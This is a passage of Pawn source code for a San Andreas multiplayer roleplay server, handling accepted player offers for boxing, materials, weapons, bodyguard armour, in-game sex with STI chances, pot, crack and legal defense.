                        TogglePlayerControllable(playerid, 0); TogglePlayerControllable(BoxOffer[playerid], 0);
                        GameTextForPlayer(playerid, "~r~Waiting", 3000, 1); GameTextForPlayer(BoxOffer[playerid], "~r~Waiting", 3000, 1);
                        BoxWaitTime[playerid] = 1; BoxWaitTime[BoxOffer[playerid]] = 1;
                        if(BoxDelay < 1) { BoxDelay = 10; }
                        InRing = 1;
                        Boxer1 = BoxOffer[playerid];
                        Boxer2 = playerid;
                        PlayerBoxing[playerid] = 1;
                        PlayerBoxing[BoxOffer[playerid]] = 1;
                        BoxOffer[playerid] = 999;
                        return 1;
                    }
				 	else
				 	{
  						SendClientMessage(playerid, COLOR_WHITE, "One of the boxers is not inside Ganton Gym!");
						return 1;
				 	}
                }
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one offered you a Boxing Challenge!");
                return 1;
            }
        }
        else if(strcmp(params,"mats",true) == 0)
		{
            if(MatsOffer[playerid] < 999)
			{
                if(GetPlayerCash(playerid) >= MatsPrice[playerid])
                {
                	if(IsPlayerConnected(MatsOffer[playerid]))
					{
    					if(GetPVarInt(playerid, "SellMatsTimer") > 0)
						{
							format(string, sizeof(string), "You must wait %d seconds before accepting materials.", GetPVarInt(playerid, "SellMatsTimer"));
							SendClientMessage(playerid,COLOR_GREY,string);
							return 1;
						}
						if(PlayerInfo[MatsOffer[playerid]][pMats] < MatsAmount[playerid])
						{
						    SendClientMessage(playerid,COLOR_GREY, "That player does not have that amount of materials anymore!");
						    return 1;
						}
     					new ip[32], ipex[32];
          				GetPlayerIp(playerid, ip, sizeof(ip));
              			GetPlayerIp(MatsOffer[playerid], ipex, sizeof(ipex));
                 		format(string, sizeof(string), "[MATERIALS (%d)] %s (IP:%s) has paid $%d to %s (IP:%s)", MatsAmount[playerid], GetPlayerNameEx(playerid), ip, MatsPrice[playerid], GetPlayerNameEx(MatsOffer[playerid]), ipex);
                   		Log("logs/pay.log", string);

						MatsWarn[playerid][MatsOffer[playerid]] += MatsPrice[playerid];
      					if(MatsWarn[playerid][MatsOffer[playerid]] >= 2500 && (PlayerInfo[MatsOffer[playerid]][pLevel] <= 3 || PlayerInfo[playerid][pLevel] <= 3))
				  		{
           					format(string, sizeof(string), "%s (IP:%s) has sold %s (IP:%s) $%d of materials in this session.", GetPlayerNameEx(MatsOffer[playerid]), ipex, GetPlayerNameEx(playerid), ip, MatsWarn[playerid][MatsOffer[playerid]]);
                  			ABroadCast(COLOR_YELLOW, string, 1);
						}

         				format(string, sizeof(string), "* You bought %d materials for $%d from %s.", MatsAmount[playerid], MatsPrice[playerid], GetPlayerNameEx(MatsOffer[playerid]));
            			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
              			format(string, sizeof(string), "* %s has bought your %d materials, the $%d was added to your money.", GetPlayerNameEx(playerid), MatsAmount[playerid], MatsPrice[playerid]);
                		SendClientMessage(MatsOffer[playerid], COLOR_LIGHTBLUE, string);

                  		GivePlayerCash(MatsOffer[playerid], MatsPrice[playerid]);
						GivePlayerCash(playerid, -MatsPrice[playerid]);
                    	PlayerInfo[playerid][pMats] += MatsAmount[playerid];
                    	PlayerInfo[MatsOffer[playerid]][pMats] -= MatsAmount[playerid];

                    	MatsOffer[playerid] = 999;
                    	MatsPrice[playerid] = 0;
                    	MatsAmount[playerid] = 0;
					}
				}
                else
				{
                    SendClientMessage(playerid, COLOR_GREY, "You can't afford those materials!");
                    return 1;
                }
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "No-one offered you any materials!");
                return 1;
            }
        }
        else if(strcmp(params,"weapon",true) == 0) {
            if(GunOffer[playerid] < 999) {
                if(IsPlayerConnected(GunOffer[playerid])) {
                    if(ProxDetectorS(5.0, playerid, GunOffer[playerid])) {
                        if(GetPVarInt(playerid, "Hospital") == 1 || GetPVarInt(playerid, "Hospital") == 2 || GetPVarInt(playerid, "Hospital") == 3 || GetPVarInt(playerid, "Hospital") == 4 || GetPVarInt(playerid, "Hospital") == 5) {
                            SendClientMessage(playerid, COLOR_GREY, "You can't spawn a weapon whilst in Hospital.");
                            return 1;
                        }
                        if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");
                        if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "Please exit the vehicle, before using this command.");
                        new weaponname[32];
                        GetWeaponName(GunId[playerid], weaponname, sizeof(weaponname));
                        format(string, sizeof(string), "   You have given %s, a %s.", GetPlayerNameEx(playerid),weaponname);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        SendClientMessage(GunOffer[playerid], COLOR_GRAD1, string);
                        format(string, sizeof(string), "   You have recieved a %s from %s.", weaponname, GetPlayerNameEx(GunOffer[playerid]));
                        SendClientMessage(playerid, COLOR_GRAD1, string);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        format(string, sizeof(string), "* %s created a Gun from Materials, and hands it to %s.", GetPlayerNameEx(GunOffer[playerid]), GetPlayerNameEx(playerid));
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                        GivePlayerValidWeapon(playerid,GunId[playerid],50000);
                        //new ip[32], ipex[32];
                        //GetPlayerIp(playerid, ip, sizeof(ip));
                        //GetPlayerIp(GunOffer[playerid], ipex, sizeof(ipex));
                        //format(string, sizeof(string), "[WEAPON DEAL] %s(IP:%s) has bought a %s from %s(IP:%s)", GetPlayerNameEx(playerid), ip, weaponname, GetPlayerNameEx(GunOffer[playerid]), ipex);
                        //Log("logs/pay.log", string);
                        PlayerInfo[GunOffer[playerid]][pMats] -= GunMats[playerid];

                        if(GunId[playerid] > 15) {
							#if defined DOUBLE_EXP_ENABLED
								new hour,minuite,second;
								gettime(hour,minuite,second);
								if(DoubleEXPcheck(hour)) {
				    				PlayerInfo[GunOffer[playerid]][pArmsSkill] += 2;
				    				SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
								}
								else {
									SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
									PlayerInfo[GunOffer[playerid]][pArmsSkill]++;
								}
							#else
							    PlayerInfo[GunOffer[playerid]][pArmsSkill]++;
							#endif
                        }

                        if(PlayerInfo[GunOffer[playerid]][pArmsSkill] == 50)
                        { SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "* Your Arms Dealer Skill is now Level 2, more weapons are available to sell."); }
                        else if(PlayerInfo[GunOffer[playerid]][pArmsSkill] == 100)
                        { SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "* Your Arms Dealer Skill is now Level 3, more weapons are available to sell."); }
                        else if(PlayerInfo[GunOffer[playerid]][pArmsSkill] == 200)
                        { SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "* Your Arms Dealer Skill is now Level 4, more weapons are available to sell."); }
                        else if(PlayerInfo[GunOffer[playerid]][pArmsSkill] == 400)
                        { SendClientMessage(GunOffer[playerid], COLOR_YELLOW, "* Your Arms Dealer Skill is now Level 5, more weapons are available to sell."); }
                        GunOffer[playerid] = 999;
                        GunId[playerid] = 0;
                        GunMats[playerid] = 0;
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GRAD2, "You need to be the near the player that is selling you the weapon!");
                        return 1;
                    }
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one offered you a Weapon!");
                return 1;
            }
        }
        else if(strcmp(params,"bodyguard",true) == 0) {
            if(GuardOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) >= GuardPrice[playerid]) {
                    if(IsPlayerConnected(GuardOffer[playerid])) {
                        if(ProxDetectorS(6.0, playerid, GuardOffer[playerid])) {
							if(GetPVarInt(playerid, "EventToken") == 1 && EventInfo[EventToggleHeal] == 1)
								return SendClientMessage(playerid, COLOR_GRAD2, "You can't heal in the event!");
                            new Float:armour;
                            GetPlayerArmour(playerid, armour);
                            if(armour >= 50) {
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You already have a vest!");
                                return 1;
                            }
                            if(PlayerBoxing[playerid] == 1)
                            {
                                SendClientMessage(playerid, COLOR_GREY, "You can't accept bodyguard while boxing.");
                                return 1;
                            }
                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(GuardOffer[playerid], ipex, sizeof(ipex));
                            //format(string, sizeof(string), "[BODYGUARD] %s (IP:%s) has paid $%d to %s (IP:%s)", GetPlayerNameEx(playerid), ip, GuardPrice[playerid], GetPlayerNameEx(GuardOffer[playerid]), ipex);
                            // Log("logs/pay.log", string);

                            GuardWarn[playerid][GuardOffer[playerid]] += GuardPrice[playerid];
                            if(GuardWarn[playerid][GuardOffer[playerid]] >= 2500 && (PlayerInfo[GuardOffer[playerid]][pLevel] <= 3 || PlayerInfo[playerid][pLevel] <= 3)) {
                                format(string, sizeof(string), "%s (IP:%s) has guarded %s (IP:%s) $%d in this session.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(GuardOffer[playerid]), ipex, GuardWarn[playerid][GuardOffer[playerid]]);
                                // Log("logs/pay.log", string);
                                ABroadCast(COLOR_YELLOW, string, 1);
                            }

                            SetPlayerArmourEx(playerid, 50);
                            GetPlayerName(GuardOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* You accepted the protection for $%d from %s.",GuardPrice[playerid],GetPlayerNameEx(GuardOffer[playerid]));
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s accepted your protection, and the $%d was added to your money.",GetPlayerNameEx(playerid),GuardPrice[playerid]);
                            SendClientMessage(GuardOffer[playerid], COLOR_LIGHTBLUE, string);
                            GivePlayerCash(GuardOffer[playerid], GuardPrice[playerid]);
                            GivePlayerCash(playerid, -GuardPrice[playerid]);
                            GuardOffer[playerid] = 999;
                            GuardPrice[playerid] = 0;
                            return 1;
                        }
                        else {
                            SendClientMessage(playerid, COLOR_GRAD2, "You're not near the person offering you guard!");
                            return 1;
                        }
                    }
                    return 1;
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   You can't afford the Protection!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one offered you any Protection!");
                return 1;
            }
        }
     	else if(strcmp(params,"sex",true) == 0) {
            if(SexOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) > SexPrice[playerid]) {
                    if(IsPlayerConnected(SexOffer[playerid])) {
                        new Car = GetPlayerVehicleID(playerid);
                        if(IsPlayerInAnyVehicle(playerid) && IsPlayerInVehicle(SexOffer[playerid], Car)) {
                            GetPlayerName(SexOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* You had sex with Whore %s, for $%d.", giveplayer, SexPrice[playerid]);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s had sex with you. You have earned $%d.", sendername, SexPrice[playerid]);
                            SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, string);

                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(SexOffer[playerid], ipex, sizeof(ipex));
                            //format(string, sizeof(string), "[SEX] %s (IP:%s) had sex with %s (IP:%s) for %d.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(SexOffer[playerid]), ipex, SexPrice[playerid]);
                            //Log("logs/pay.log", string);

                            SexWarn[playerid][SexOffer[playerid]] += SexPrice[playerid];
                            if(SexWarn[playerid][SexOffer[playerid]] >= 2500 && (PlayerInfo[SexOffer[playerid]][pLevel] <= 3 || PlayerInfo[playerid][pLevel] <= 3)) {
                                format(string, sizeof(string), "%s (IP:%s) had sex with %s (IP:%s) for $%d in this session.", GetPlayerNameEx(playerid), ip, GetPlayerNameEx(SexOffer[playerid]), ipex, SexWarn[playerid][SexOffer[playerid]]);
                                //Log("logs/pay.log", string);
                                ABroadCast(COLOR_YELLOW, string, 1);
                            }

                            GivePlayerCash(SexOffer[playerid], SexPrice[playerid]);
                            GivePlayerCash(playerid, -SexPrice[playerid]);

                            #if defined DOUBLE_EXP_ENABLED
								new hour,minuite,second;
								gettime(hour,minuite,second);
								if(DoubleEXPcheck(hour))
								{
	 					 			PlayerInfo[SexOffer[playerid]][pSexSkill] += 2;
		   					 		SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
								}
								else
								{
									SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
									PlayerInfo[SexOffer[playerid]][pSexSkill]++;
								}
							#else
							    PlayerInfo[SexOffer[playerid]][pSexSkill]++;
							#endif

                            if(PlayerInfo[SexOffer[playerid]][pSexSkill] == 50) {
                                SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "* Your Sex Skill is now Level 2, you offer better Sex (health) and less chance on STI.");
                            }
                            else if(PlayerInfo[SexOffer[playerid]][pSexSkill] == 100) {
                                SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "* Your Sex Skill is now Level 3, you offer better Sex (health) and less chance on STI.");
                            }
                            else if(PlayerInfo[SexOffer[playerid]][pSexSkill] == 200) {
                                SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "* Your Sex Skill is now Level 4, you offer better Sex (health) and less chance on STI.");
                            }
                            else if(PlayerInfo[SexOffer[playerid]][pSexSkill] == 400) {
                                SendClientMessage(SexOffer[playerid], COLOR_YELLOW, "* Your Sex Skill is now Level 5, you offer better Sex (health) and less chance on STI.");
                            }

                            if(!GetPVarType(playerid, "STD")) {
                                if(Condom[playerid] < 1) {
                                    new Float:health;
                                    new level = PlayerInfo[SexOffer[playerid]][pSexSkill];
                                    if(level >= 0 && level < 50) {
                                        GetPlayerHealth(playerid, health);
                                        if(health < 100) {
                                            if(health > 90) {
                                                SetPlayerHealth(playerid, 100);
                                            }
                                            else {
                                                SetPlayerHealth(playerid, health + 10.0);
                                            }
                                        }
                                        new rand = random(sizeof(STD1));
                                        SetPVarInt(playerid, "STD", STD1[rand]);
                                        SetPVarInt(SexOffer[playerid], "STD", STD1[rand]);
                                        if(STD1[rand] == 0) {
                                            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 10 Health + no STD while having Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You haven't got a STD while having Sex.");
                                        }
                                        else if(STD1[rand] == 1) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 10 Health + a Chlamydia because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Chlamydia because of the Sex."); }
                                        else if(STD1[rand] == 2) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 10 Health + a Gonorrhea because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Gonorrhea because of the Sex."); }
                                        else if(STD1[rand] == 3) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 10 Health + a Syphilis because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Syphilis because of the Sex."); }
                                    }
                                    else if(level >= 50 && level < 100) {
                                        GetPlayerHealth(playerid, health);
                                        if(health < 100) {
                                            if(health > 80) {
                                                SetPlayerHealth(playerid, 100);
                                            }
                                            else {
                                                SetPlayerHealth(playerid, health + 20.0);
                                            }
                                        }
                                        new rand = random(sizeof(STD2));
                                        SetPVarInt(playerid, "STD", STD2[rand]);
                                        SetPVarInt(SexOffer[playerid], "STD", STD2[rand]);
                                        if(STD2[rand] == 0) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 20 Health + no STD while having Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You haven't got a STD while having Sex."); }
                                        else if(STD2[rand] == 1) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 20 Health + a Chlamydia because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Chlamydia because of the Sex."); }
                                        else if(STD2[rand] == 2) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 20 Health + a Gonorrhea because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Gonorrhea because of the Sex."); }
                                        else if(STD2[rand] == 3) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 20 Health + a Syphilis because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Syphilis because of the Sex."); }
                                    }
                                    else if(level >= 100 && level < 200) {
                                        GetPlayerHealth(playerid, health);
                                        if(health < 100) {
                                            if(health > 70) {
                                                SetPlayerHealth(playerid, 100);
                                            }
                                            else {
                                                SetPlayerHealth(playerid, health + 30.0);
                                            }
                                        }
                                        new rand = random(sizeof(STD3));
                                        SetPVarInt(playerid, "STD", STD3[rand]);
                                        SetPVarInt(SexOffer[playerid], "STD", STD3[rand]);
                                        if(STD3[rand] == 0) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 30 Health + no STD while having Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You haven't got a STD while having Sex."); }
                                        else if(STD3[rand] == 1) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 30 Health + a Chlamydia because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Chlamydia because of the Sex."); }
                                        else if(STD3[rand] == 2) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 30 Health + a Gonorrhea because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Gonorrhea because of the Sex."); }
                                        else if(STD3[rand] == 3) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 30 Health + a Syphilis because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Syphilis because of the Sex."); }
                                    }
                                    else if(level >= 200 && level < 400) {
                                        GetPlayerHealth(playerid, health);
                                        if(health < 100) {
                                            if(health > 60) {
                                                SetPlayerHealth(playerid, 100);
                                            }
                                            else {
                                                SetPlayerHealth(playerid, health + 40.0);
                                            }
                                        }
                                        new rand = random(sizeof(STD4));
                                        SetPVarInt(playerid, "STD", STD4[rand]);
                                        SetPVarInt(SexOffer[playerid], "STD", STD4[rand]);
                                        if(STD4[rand] == 0) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 40 Health + no STD while having Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You haven't got a STD while having Sex."); }
                                        else if(STD4[rand] == 1) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 40 Health + a Chlamydia because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Chlamydia because of the Sex."); }
                                        else if(STD4[rand] == 2) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 40 Health + a Gonorrhea because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Gonorrhea because of the Sex."); }
                                        else if(STD4[rand] == 3) { SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You got 40 Health + a Syphilis because of the Sex."); SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* You got a Syphilis because of the Sex."); }
                                    }
                                    else if(level >= 400) {
                                        GetPlayerHealth(playerid, health);
                                        if(health > 50) {
                                            SetPlayerHealth(playerid, 100);
                                        }
                                        else {
                                            SetPlayerHealth(playerid, health + 50.0);
                                        }
                                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Your Sex Skill Level is so high you gave high health and No STD.");
                                        SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* The Whore's Sex Skill Level is so high you got high health and No STD.");
                                    }
                                }
                                else {
                                    SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* The player used a Condom.");
                                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You used a Condom.");
                                    Condom[playerid] --;
                                }
                            }
                            else {
                                SendClientMessage(SexOffer[playerid], COLOR_LIGHTBLUE, "* That player was already infected with a STI, can't get another one.");
                            }
                            SexOffer[playerid] = 999;
                            return 1;
                        }
                        else {
                            SendClientMessage(playerid, COLOR_GREY, "   You or the Whore are not both in a Car!");
                            return 1;
                        }
                    }                             //Connected or not
                    return 1;
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   You can't afford the Sex!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   You don't have any sex offered by a Whore!");
                return 1;
            }
        }
        else if(strcmp(params,"pot",true) == 0) {
            if(PotOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) > PotPrice[playerid]) {
                    if(PlayerInfo[playerid][pPot] < 25) {
                        if(IsPlayerConnected(PotOffer[playerid])) {
							if(PlayerInfo[PotOffer[playerid]][pPot] < PotGram[playerid])
							{
						    	SendClientMessage(playerid,COLOR_GREY, "That player does not have that amount of pot anymore!");
						    	return 1;
							}
                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(PotOffer[playerid], ipex, sizeof(ipex));
                            //format(string, sizeof(string), "[POT (%d GRAMS)] %s (IP:%s) has paid $%d to %s (IP:%s)", PotGram[playerid], GetPlayerNameEx(playerid), ip, PotPrice[playerid], GetPlayerNameEx(PotOffer[playerid]), ipex);
                            //Log("logs/pay.log", string);*/

                            PotWarn[playerid][PotOffer[playerid]] += PotPrice[playerid];
                            if(PotWarn[playerid][PotOffer[playerid]] >= 2500 && (PlayerInfo[PotOffer[playerid]][pLevel] <= 3 || PlayerInfo[PotOffer[playerid]][pLevel] <= 3)) {
                                format(string, sizeof(string), "%s (IP:%s) has sold %s (IP:%s) $%d of pot in this session.", GetPlayerNameEx(PotOffer[playerid]), ipex, GetPlayerNameEx(playerid), ip, PotWarn[playerid][PotOffer[playerid]]);
                                //Log("logs/pay.log", string);
                                ABroadCast(COLOR_YELLOW, string, 1);
                            }

                            GetPlayerName(PotOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* You bought %d gram(s) for $%d from Drug Dealer %s.",PotGram[playerid],PotPrice[playerid],giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s has bought your %d gram(s), the $%d was added to your money.",sendername,PotGram[playerid],PotPrice[playerid]);
                            SendClientMessage(PotOffer[playerid], COLOR_LIGHTBLUE, string);
                            PlayerInfo[PotOffer[playerid]][pCash] += PotPrice[playerid];

                            #if defined DOUBLE_EXP_ENABLED
								new hour,minuite,second;
								gettime(hour,minuite,second);
								if(DoubleEXPcheck(hour))
								{
				    				PlayerInfo[PotOffer[playerid]][pDrugsSkill] += 2;
				    				SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
								}
								else
								{
									SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
									PlayerInfo[PotOffer[playerid]][pDrugsSkill]++;
								}
							#else
                                PlayerInfo[PotOffer[playerid]][pDrugsSkill]++;
							#endif

                            GivePlayerCash(playerid, -PotPrice[playerid]);
                            PlayerInfo[playerid][pPot] += PotGram[playerid];
                            PlayerInfo[PotOffer[playerid]][pPot] -= PotGram[playerid];
                            if(PlayerInfo[PotOffer[playerid]][pDrugsSkill] == 50)
                            { SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 2, you can buy more Grams and Cheaper."); }
                            else if(PlayerInfo[PotOffer[playerid]][pDrugsSkill] == 100)
                            { SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 3, you can buy more Grams and Cheaper."); }
                            else if(PlayerInfo[PotOffer[playerid]][pDrugsSkill] == 200)
                            { SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 4, you can buy more Grams and Cheaper."); }
                            else if(PlayerInfo[PotOffer[playerid]][pDrugsSkill] == 400)
                            { SendClientMessage(PotOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 5, you can buy more Grams and Cheaper."); }
                            PotOffer[playerid] = 999;
                            PotPrice[playerid] = 0;
                            PotGram[playerid] = 0;
                            return 1;
                        }
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   You're fully loaded with Drugs, use them first!");
                        return 1;
                    }
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   You can't afford those Pot!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one offered you any Pot!");
                return 1;
            }
        }
        else if(strcmp(params,"crack",true) == 0) {
            if(CrackOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) > CrackPrice[playerid]) {
                    if(PlayerInfo[playerid][pCrack] < 25) {
                        if(IsPlayerConnected(CrackOffer[playerid])) {
 							if(PlayerInfo[CrackOffer[playerid]][pCrack] < CrackGram[playerid])
							{
						    	SendClientMessage(playerid,COLOR_GREY, "That player does not have that amount of crack anymore!");
						    	return 1;
							}
                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(CrackOffer[playerid], ipex, sizeof(ipex));
                            //format(string, sizeof(string), "[CRACK DEAL (%d GRAMS)] %s (IP:%s) has paid $%d to %s (IP:%s)", CrackGram[playerid], GetPlayerNameEx(playerid), ip, CrackPrice[playerid], GetPlayerNameEx(CrackOffer[playerid]), ipex);
                            // Log("logs/pay.log", string);

                            CrackWarn[playerid][CrackOffer[playerid]] += CrackPrice[playerid];
                            if(CrackWarn[playerid][CrackOffer[playerid]] >= 2500 && (PlayerInfo[CrackOffer[playerid]][pLevel] <= 3 || PlayerInfo[CrackOffer[playerid]][pLevel] <= 3)) {
                                format(string, sizeof(string), "%s (IP:%s) has sold %s (IP:%s) $%d of crack in this session.", GetPlayerNameEx(CrackOffer[playerid]), ipex, GetPlayerNameEx(playerid), ip, CrackWarn[playerid][CrackOffer[playerid]]);
                                ABroadCast(COLOR_YELLOW, string, 1);
                            }

                            GivePlayerCash(playerid, -CrackPrice[playerid]);
                            GivePlayerCash(CrackOffer[playerid], CrackPrice[playerid]);
                            GetPlayerName(CrackOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* You bought %d gram(s) for $%d from Drug Dealer %s.",CrackGram[playerid],CrackPrice[playerid],giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s has bought your %d gram(s), the $%d was added to your money.",sendername,CrackGram[playerid],CrackPrice[playerid]);
                            SendClientMessage(CrackOffer[playerid], COLOR_LIGHTBLUE, string);

							#if defined DOUBLE_EXP_ENABLED
	     						new hour,minuite,second;
								gettime(hour,minuite,second);
								if(DoubleEXPcheck(hour))
								{
				    				PlayerInfo[CrackOffer[playerid]][pDrugsSkill] += 2;
				    				SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "* You have gained two skill points for this job due to double experience.");
								}
								else
								{
									SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "* You have only gained one skill point for this job since it's not within the double experience hours.");
									PlayerInfo[CrackOffer[playerid]][pDrugsSkill]++;
								}
							#else
                            	PlayerInfo[CrackOffer[playerid]][pDrugsSkill]++;
                            #endif

                            PlayerInfo[playerid][pCrack] += CrackGram[playerid];
                            PlayerInfo[CrackOffer[playerid]][pCrack] -= CrackGram[playerid];
                            if(PlayerInfo[CrackOffer[playerid]][pDrugsSkill] == 50)
                            { SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 2, you can buy more Grams and Cheaper."); }
                            else if(PlayerInfo[CrackOffer[playerid]][pDrugsSkill] == 100)
                            { SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 3, you can buy more Grams and Cheaper."); }
                            else if(PlayerInfo[CrackOffer[playerid]][pDrugsSkill] == 200)
                            { SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 4, you can buy more Grams and Cheaper."); }
                            else if(PlayerInfo[CrackOffer[playerid]][pDrugsSkill] == 400)
                            { SendClientMessage(CrackOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 5, you can buy more Grams and Cheaper."); }
							CrackOffer[playerid] = 999;
                            CrackPrice[playerid] = 0;
                            CrackGram[playerid] = 0;
                            return 1;
                        }
                        return 1;
                    }
                    else {
                        SendClientMessage(playerid, COLOR_GREY, "   You're fully loaded with Crack, use them first!");
                        return 1;
                    }
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "   You can't afford that Crack!");
                    return 1;
                }
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, "   No-one offered you any Crack!");
                return 1;
            }
        }
        else if(strcmp(params,"defense",true) == 0) {
            if(DefendOffer[playerid] < 999) {
                if(GetPlayerCash(playerid) > DefendPrice[playerid]) {
                    if(IsPlayerConnected(DefendOffer[playerid])) {
                        if(IsPlayerInAnyVehicle(playerid))
                            return SendClientMessage(playerid, COLOR_GREY, "You can't be in a vehicle while you accept defense.");

						if(PlayerCuffed[playerid] > 0)
